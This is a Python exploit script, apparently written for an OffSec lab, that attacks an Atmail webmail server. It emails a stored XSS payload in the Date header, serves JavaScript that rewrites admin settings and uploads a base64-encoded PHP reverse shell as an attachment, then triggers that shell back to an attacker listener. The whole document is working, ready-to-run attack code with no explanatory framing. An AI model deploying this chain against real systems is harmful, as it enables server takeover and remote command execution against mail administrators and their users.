#!/usr/bin/python
import sys
import base64
import socket
import urlparse
import telnetlib
import BaseHTTPServer
from threading import Thread
from SimpleHTTPServer import SimpleHTTPRequestHandler
import smtplib
from smtplib import SMTPException

def sendmail():
    sender = 'victims@offsec.local'
    receivers = 'admin@offsec.local'
    message = """From: victim@offsec.local
To: admin@offsec.local
Date: <script src="http://192.168.11.248/poc.js"></script>
MIME-Version: 1.0
Content-type: text/html
Subject: Urgent!!

    you have been pwnd by Win Sam\r\n
    """

    smtpObj = smtplib.SMTP('192.168.11.236')
    smtpObj.sendmail(sender, receivers, message)         
    print "Successfully sent email"



def exec_code(rport):
    handlerthr = Thread(target=handler, args=(rport,))
    handlerthr.start()
 
def handler(rport):
    print "(+) starting handler on port %d" % int(rport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(rport)))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" % addr[0]
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()

def get_js_payload():
    return """
   var c=new XMLHttpRequest();
   var urlc ="http://192.168.11.236/index.php/admin/settings/globalsave";
   var datac="save=1&fields%5Bemail%5D=postmaster%40mydomain.com&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=";
   c.open("POST", urlc, true);
   c.setRequestHeader("Content-Length",datac.length);
   c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   c.send(datac);

    var a=new XMLHttpRequest();
    var url="http://192.168.11.236/index.php/mail/composemessage/addattachment/composeID/uid815c57ebd3";
    var boundary="---------------------------14059916481749223182071623662";
    var revshell=atob("DQo8P3BocAovLyBwaHAtcmV2ZXJzZS1zaGVsbCAtIEEgUmV2ZXJzZSBTaGVsbCBpbXBsZW1lbnRhdGlvbiBpbiBQSFAKLy8gQ29weXJpZ2h0IChDKSAyMDA3IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8KLy8gVGhpcyB0b29sIG1heSBiZSB1c2VkIGZvciBsZWdhbCBwdXJwb3NlcyBvbmx5LiAgVXNlcnMgdGFrZSBmdWxsIHJlc3BvbnNpYmlsaXR5Ci8vIGZvciBhbnkgYWN0aW9ucyBwZXJmb3JtZWQgdXNpbmcgdGhpcyB0b29sLiAgVGhlIGF1dGhvciBhY2NlcHRzIG5vIGxpYWJpbGl0eQovLyBmb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8geW91LCB0aGVuCi8vIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwovLyBJbiBhbGwgb3RoZXIgcmVzcGVjdHMgdGhlIEdQTCB2ZXJzaW9uIDIgYXBwbGllczoKLy8KLy8gVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKLy8gaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2ZXJzaW9uIDIgYXMKLy8gcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uCi8vCi8vIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAovLyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgovLyBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCi8vIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCi8vCi8vIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFsb25nCi8vIHdpdGggdGhpcyBwcm9ncmFtOyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4sCi8vIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCi8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIElmIHRoZXNlIHRlcm1zIGFyZSBub3QgYWNjZXB0YWJsZSB0bwovLyB5b3UsIHRoZW4gZG8gbm90IHVzZSB0aGlzIHRvb2wuCi8vCi8vIFlvdSBhcmUgZW5jb3VyYWdlZCB0byBzZW5kIGNvbW1lbnRzLCBpbXByb3ZlbWVudHMgb3Igc3VnZ2VzdGlvbnMgdG8KLy8gbWUgYXQgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldAovLwovLyBEZXNjcmlwdGlvbgovLyAtLS0tLS0tLS0tLQovLyBUaGlzIHNjcmlwdCB3aWxsIG1ha2UgYW4gb3V0Ym91bmQgVENQIGNvbm5lY3Rpb24gdG8gYSBoYXJkY29kZWQgSVAgYW5kIHBvcnQuCi8vIFRoZSByZWNpcGllbnQgd2lsbCBiZSBnaXZlbiBhIHNoZWxsIHJ1bm5pbmcgYXMgdGhlIGN1cnJlbnQgdXNlciAoYXBhY2hlIG5vcm1hbGx5KS4KLy8KLy8gTGltaXRhdGlvbnMKLy8gLS0tLS0tLS0tLS0KLy8gcHJvY19vcGVuIGFuZCBzdHJlYW1fc2V0X2Jsb2NraW5nIHJlcXVpcmUgUEhQIHZlcnNpb24gNC4zKywgb3IgNSsKLy8gVXNlIG9mIHN0cmVhbV9zZWxlY3QoKSBvbiBmaWxlIGRlc2NyaXB0b3JzIHJldHVybmVkIGJ5IHByb2Nfb3BlbigpIHdpbGwgZmFpbCBhbmQgcmV0dXJuIEZBTFNFIHVuZGVyIFdpbmRvd3MuCi8vIFNvbWUgY29tcGlsZS10aW1lIG9wdGlvbnMgYXJlIG5lZWRlZCBmb3IgZGFlbW9uaXNhdGlvbiAobGlrZSBwY250bCwgcG9zaXgpLiAgVGhlc2UgYXJlIHJhcmVseSBhdmFpbGFibGUuCi8vCi8vIFVzYWdlCi8vIC0tLS0tCi8vIFNlZSBodHRwOi8vcGVudGVzdG1vbmtleS5uZXQvdG9vbHMvcGhwLXJldmVyc2Utc2hlbGwgaWYgeW91IGdldCBzdHVjay4KCnNldF90aW1lX2xpbWl0ICgwKTsKJFZFUlNJT04gPSAiMS4wIjsKJGlwID0gJzE5Mi4xNjguMTEuMjQ4JzsgIC8vIENIQU5HRSBUSElTCiRwb3J0ID0gMTIzNDsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKLy8KLy8gRGFlbW9uaXNlIG91cnNlbGYgaWYgcG9zc2libGUgdG8gYXZvaWQgem9tYmllcyBsYXRlcgovLwoKLy8gcGNudGxfZm9yayBpcyBoYXJkbHkgZXZlciBhdmFpbGFibGUsIGJ1dCB3aWxsIGFsbG93IHVzIHRvIGRhZW1vbmlzZQovLyBvdXIgcGhwIHByb2Nlc3MgYW5kIGF2b2lkIHpvbWJpZXMuICBXb3J0aCBhIHRyeS4uLgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCS8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCgkvLyBNYWtlIHRoZSBjdXJyZW50IHByb2Nlc3MgYSBzZXNzaW9uIGxlYWRlcgoJLy8gV2lsbCBvbmx5IHN1Y2NlZWQgaWYgd2UgZm9ya2VkCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCi8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CmNoZGlyKCIvIik7CgovLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAp1bWFzaygwKTsKCi8vCi8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCi8vCgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKLy8gU3Bhd24gc2hlbGwgcHJvY2VzcwokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVAoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQoJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNURE9VVAoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmCi8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0KCj8+IAoKCgo=");
    var length=revshell.length;

    a.open("POST",url,true);
    a.setRequestHeader("Content-Type", "multipart/form-data, boundary=---------------------------14059916481749223182071623662");
    a.setRequestHeader("Content-Length",length);
    var data  = "--"+ boundary +"\\r\\n";
    data += 'Content-Disposition: form-data; name="newAttachment"; filename="php-reverse-shell.php"\\r\\n';
    data += "Content-Type: application/x-php\\r\\n\\r\\n";
    data += revshell+"\\r\\n";
    data += "--" + boundary + "--";
    a.send(data);
      function sleep(miliseconds) {
                    var currentTime = new Date().getTime();
                    while (currentTime + miliseconds >= new Date().getTime()) {
                    }
                }

    sleep(2000);

    var b = new XMLHttpRequest();
    var urlb="http://192.168.11.236/index.php/mail/composemessage/send/tabId/viewmessageTab2";
    b.open("POST",urlb,true);
    b.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    var datab="tabId=viewmessageTab2&composeID=uid815c57ebd3&relatedMessageFolder=&relatedMessageUIDs=&relatedMessageMessageId=&relatedMessageResponseType=&relatedDraftUID=&readReceiptRequested=false&emailTo=admin%40offsec.local&emailSubject=AAASSS&emailCc=&emailBcc=&attachments%5Bphpreverseshellphp%5D%5BfilenameFS%5D=application_x-php-uid815c57ebd3-php-reverse-shell.php&attachments%5Bphpreverseshellphp%5D%5BfilenameOriginal%5D=php-reverse-shell.php&attachments%5Bphpreverseshellphp%5D%5BmimeType%5D=application%2Fx-php&emailBodyHtml=%3Cbr%3E%0A%09%09%09%09%3Cbr%3E";
    var lengthb=datab.length;
    b.setRequestHeader("Content-Length",lengthb);
    b.send(datab);

    sleep(1000);

    var i;
    for (i = 0; i < 10; i++) {
    var f = new XMLHttpRequest();
    var urlf="http://192.168.11.236/index.php/mail/viewmessage/getattachment/folder/INBOX.Sent/uniqueId/"+ i +"/mimeType/YXBwbGljYXRpb24veC1waHA=/filenameOriginal/php-reverse-shell.php";
    f.open("GET",urlf,true);
    f.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    f.send(null);
    var g = new XMLHttpRequest();
    var urlg="http://192.168.11.236/a/d/adminoffseclocal/INBOX.Sent" + i + "php-reverse-shell.php";
    g.open("POST",urlg,true);
    g.send(null);
    }

    """

class poc(SimpleHTTPRequestHandler):



    # log nothing...
    def log_message(self, format, *args):
        return

    def do_GET(self):

        self.send_response(200)
        self.send_header("Content-type", "application/js")
        self.end_headers()

        if "poc.js" in self.path:

            # start the connectback client
            exec_code(rport)

            print"(+) sending the js payload..."
           
            # send the malicious JavaScript code
            self.wfile.write(get_js_payload())


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print "Usage: %s <lport> [connectback <host:port>]" % sys.argv[0]
        print "eg: %s 8000 172.16.175.1:7777" % sys.argv[0]
        sys.exit(-1)

    try:
        rhost   = sys.argv[2].split(":")[0]
        rport   = sys.argv[2].split(":")[1]
    except:
        print "(-) connectback host and port needs to be in the format \"host:port\""
        sys.exit(-1)

    # start the server

    sendmail()
    BaseHTTPServer.test(poc, BaseHTTPServer.HTTPServer)

